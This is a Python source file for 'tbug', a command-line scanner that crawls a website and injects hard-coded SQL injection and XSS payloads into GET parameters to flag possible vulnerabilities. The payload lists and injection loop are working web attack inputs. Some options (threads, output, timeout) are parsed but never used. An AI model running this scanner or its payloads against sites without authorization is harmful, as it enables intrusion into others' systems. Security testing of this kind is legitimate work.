import os
import sys
import numpy as np
import plotly.express as px
import requests
import argparse
import colorama

from urllib.parse import urljoin, urlparse, urlencode
from bs4 import BeautifulSoup
#----------------------------------------------------------------------#


#----------------------------------------------------------------------#
#         Default payloads for SQL Injection and XSS testing 
#----------------------------------------------------------------------#
SQLI_PAYLOADS = [
    "' OR '1'='1",
    "' OR '1'='1' -- ",
    "' OR '1'='1' /* ",
    "' OR '1'='1' # ",
    "' OR '1'='1' -- -",
    "' OR '1'='1' /* -",
    "' OR '1'='1' # -",
    "' OR '1'='1' -- -- ",
    "' OR '1'='1' /* -- ",
    "' OR '1'='1' # -- ",
]

XSS_PAYLOADS = [
    "<script>alert('XSS')</script>",
    "<img src='x' onerror='alert(\"XSS\")'>",
    "<svg onload='alert(\"XSS\")'>",
    "<iframe src='javascript:alert(\"XSS\")'></iframe>",
    "<body onload='alert(\"XSS\")'>",
    "<input type='text' value='<script>alert(\"XSS\")</script>'>",
    "<a href='javascript:alert(\"XSS\")'>Click me</a>",
    "<div style='background-image: url(javascript:alert(\"XSS\"))'>",
    "<object data='javascript:alert(\"XSS\")'></object>",
    "<embed src='javascript:alert(\"XSS\")'></embed>",
]
#----------------------------------------------------------------------#

TIMEOUT = 10
THREADS = 5

#--------#
# BANNER #
#--------#
def get_banner():
    return f"""
{colorama.Fore.LIGHTMAGENTA_EX}
████████╗   ██████╗ ██╗   ██╗ ██████╗ 
╚══██╔══╝   ██╔══██╗██║   ██║██╔════╝ 
   ██║█████╗██████╔╝██║   ██║██║  ███╗
   ██║╚════╝██╔══██╗██║   ██║██║   ██║
   ██║      ██████╔╝╚██████╔╝╚██████╔╝
   ╚═╝      ╚═════╝  ╚═════╝  ╚═════╝ 
#------------------------------------#
# SQLI and XSS Vulnerability Scanner #
#      Developed by AbelPhilippe     #
#------------------------------------#

Usage: tbug -u <target> [options]
"""

def print_help():
    print(get_banner())
    help_text = f"""{colorama.Fore.MAGENTA}
General:
  -h, --help                Show this help
  -u, --url <target>        Target URL
  -l, --list <file>         Target list file
  -o, --output <file>       Output file
  -v, --verbose             Verbose mode
  -s, --silent              Silent mode

Performance:
  -t, --threads <n>         Number of threads
  --timeout <sec>          Timeout

SQLi:
  --sqli-payloads <file>    SQLi payload file

XSS:
  --xss-payloads <file>     XSS payload file

Examples:
  tbug -u https://site.com
  tbug -l targets.txt -t 20
  tbug -u https://site.com --sqli-payloads sqli_payloads.txt --xss-payloads xss_payloads.txt -v
  {colorama.Style.RESET_ALL}
"""
    print(help_text)

def parse_arguments():

    parser = argparse.ArgumentParser(
        prog="tbug",
        add_help=False
    )

    # Help custom
    parser.add_argument(
        "-h", "--help",
        action="store_true",
        help="Show help"
    )

    target = parser.add_mutually_exclusive_group()

    target.add_argument(
        "-u", "--url",
        help="Target URL"
    )

    target.add_argument(
        "-l", "--list",
        help="Target list file"
    )

    # ===============================
    # General
    # ===============================
    parser.add_argument(
        "-o", "--output",
        default="scan_results.txt"
    )

    parser.add_argument(
        "-v", "--verbose",
        action="store_true"
    )

    parser.add_argument(
        "-s", "--silent",
        action="store_true"
    )

    # ===============================
    # Performance
    # ===============================
    parser.add_argument(
        "-t", "--threads",
        type=int,
        default=THREADS
    )

    parser.add_argument(
        "--timeout",
        type=int,
        default=TIMEOUT
    )

    # ===============================
    # Payloads
    # ===============================
    parser.add_argument("--sqli-payloads")
    parser.add_argument("--xss-payloads")

    return parser


#============================================================================#
# Here we will implement the core scanning logic, including functions
# to test for SQL Injection and XSS vulnerabilities. 
# We will also handle threading and output management.
#============================================================================#

def is_valid_url(url):
    try:
        parsed = urlparse(url)

        return (
            parsed.scheme in ("http", "https")
            and parsed.netloc != ""
        )

    except Exception:
        print(
            f"{colorama.Fore.RED}[-] Invalid URL: {url}{colorama.Style.RESET_ALL}"
        )
        return False
    
def is_same_domain(base_url, target_url):
    try:
        base_domain = urlparse(base_url).netloc
        target_domain = urlparse(target_url).netloc
        return base_domain == target_domain
    except Exception as e:
        print(f"{colorama.Fore.RED}[-] Error comparing domains: {e}{colorama.Style.RESET_ALL}")
        return False
    
#=============================#
# CRAWLER
#=============================#

def crawl(start_url):
    to_visit = [start_url]
    visited = set()
    urls = []

    while to_visit:
        current_url = to_visit.pop(0)

        if current_url in visited:
            continue

        visited.add(current_url)

        try:
            response = requests.get(current_url, timeout = TIMEOUT)
        except requests.RequestException:
            print(f"{colorama.Fore.RED}[-] Failed to fetch: {current_url}{colorama.Style.RESET_ALL}")
            continue

        urls.append(current_url)

        soup = BeautifulSoup(response.text, "html.parser")

        for link in soup.find_all("a"):
            href = link.get("href")

            if not href:
                continue

            full_url = urljoin(current_url, href)

            if not is_valid_url(full_url):
                continue

            if not is_same_domain(start_url, full_url):
                continue

            if full_url not in visited and full_url not in to_visit:
                to_visit.append(full_url)

    return urls

#=============================#
# GET Params extraction
#=============================#

def extract_get_parameters(url):
    parsed = urlparse(url)
    params = {}

    if parsed.query:
        for pair in parsed.query.split("&"):
            if "=" in pair:
                key, _ = pair.split("=", 1)
                params[key] = "1"

    return params

#=============================#
# SQL Injection Scanner
#=============================#

def scan_sqli(url):
    params = extract_get_parameters(url)

    if not params:
        return

    # Base response
    base_query = urlencode(params)
    base_url = f"{url.split('?')[0]}?{base_query}"

    try:
        base_response = requests.get(base_url, timeout=TIMEOUT)
        base_len = len(base_response.text)
    except requests.RequestException:
        return

    for param in params:
        for payload in SQLI_PAYLOADS:
            test_params = params.copy()
            test_params[param] = payload

            query = urlencode(test_params)
            test_url = f"{url.split('?')[0]}?{query}"

            try:
                response = requests.get(test_url, timeout=TIMEOUT)
            except requests.RequestException:
                continue

            diff = abs(len(response.text) - base_len)

            if diff > 50:
                print(f"{colorama.Fore.LIGHTCYAN_EX}[+] POSSIBLE SQL INJECTION")
                print(f"{colorama.Fore.LIGHTCYAN_EX}    URL: {test_url}")
                print(f"{colorama.Fore.LIGHTCYAN_EX}    Param: {param}")
                print(f"{colorama.Fore.LIGHTCYAN_EX}    Payload: {payload}")
                print(f"{colorama.Fore.YELLOW}    Answer difference: {diff}")
                print(f"{colorama.Fore.MAGENTA}-" * 60)

#=============================#
# XSS Scanner
#=============================#

def scan_xss(url):
    params = extract_get_parameters(url)

    if not params:
        return

    for param in params:
        for payload in XSS_PAYLOADS:
            test_params = params.copy()
            test_params[param] = payload

            query = urlencode(test_params)
            test_url = f"{url.split('?')[0]}?{query}"

            try:
                response = requests.get(test_url, timeout=TIMEOUT)
            except requests.RequestException:
                continue

            if payload in response.text:
                print(f"{colorama.Fore.LIGHTCYAN_EX}[+] POSSIBLE XSS VULNERABILITY")
                print(f"{colorama.Fore.LIGHTCYAN_EX}    URL: {test_url}")
                print(f"{colorama.Fore.LIGHTCYAN_EX}    Param: {param}")
                print(f"{colorama.Fore.LIGHTCYAN_EX}    Payload: {payload}")
                print(f"{colorama.Fore.MAGENTA}-" * 60)

#------------------#
# Main Function
#------------------#

def main():

    colorama.init(autoreset=True)

    parser = parse_arguments()
    args = parser.parse_args()

    # Help
    if args.help:
        print_help()
        sys.exit(0)

    # If no arguments, show banner
    if len(sys.argv) == 1:
        print(get_banner())
        sys.exit(0)

    if not args.url and not args.list:
        print(get_banner())
        print(f"{colorama.Fore.YELLOW}[-] You must specify -u or -l{colorama.Style.RESET_ALL}")
        print(f"{colorama.Fore.YELLOW}Use -h for help.")
        sys.exit(1)

    print(get_banner())

    url = args.url
    list_file = args.list
    output = args.output
    threads = args.threads
    timeout = args.timeout
    verbose = args.verbose
    silent = args.silent

    # ===============================
    # Verbose
    # ===============================
    if verbose:
        print(f"{colorama.Fore.LIGHTMAGENTA_EX}[+] Threads: {threads}")
        print(f"{colorama.Fore.LIGHTMAGENTA_EX}[+] Timeout: {timeout}")

    # ===============================
    # Target
    # ===============================
    targets = []

    if url:
        if not is_valid_url(url):
            sys.exit(1)

        targets.append(url)

    if list_file:
        if not os.path.exists(list_file):
            print(f"{colorama.Fore.LIGHTYELLOW_EX}[-] File not found: {list_file}")
            sys.exit(1)

        with open(list_file) as f:
            for line in f:
                line = line.strip()

                if line and is_valid_url(line):
                    targets.append(line)

    if not targets:
        print(f"{colorama.Fore.LIGHTYELLOW_EX}[-] No valid targets found")
        sys.exit(1)

    # ===============================
    # Start Scan
    # ===============================
    for target in targets:

        if not silent:
            print(f"{colorama.Fore.LIGHTMAGENTA_EX}\n[+] Scanning: {target}")

        urls = crawl(target)

        if verbose:
            print(f"{colorama.Fore.GREEN}[+] Found {len(urls)} URLs")

        for url in urls:
            scan_sqli(url)
            scan_xss(url)

    print("\n[+] Scan finished.")


if __name__ == "__main__":
    main()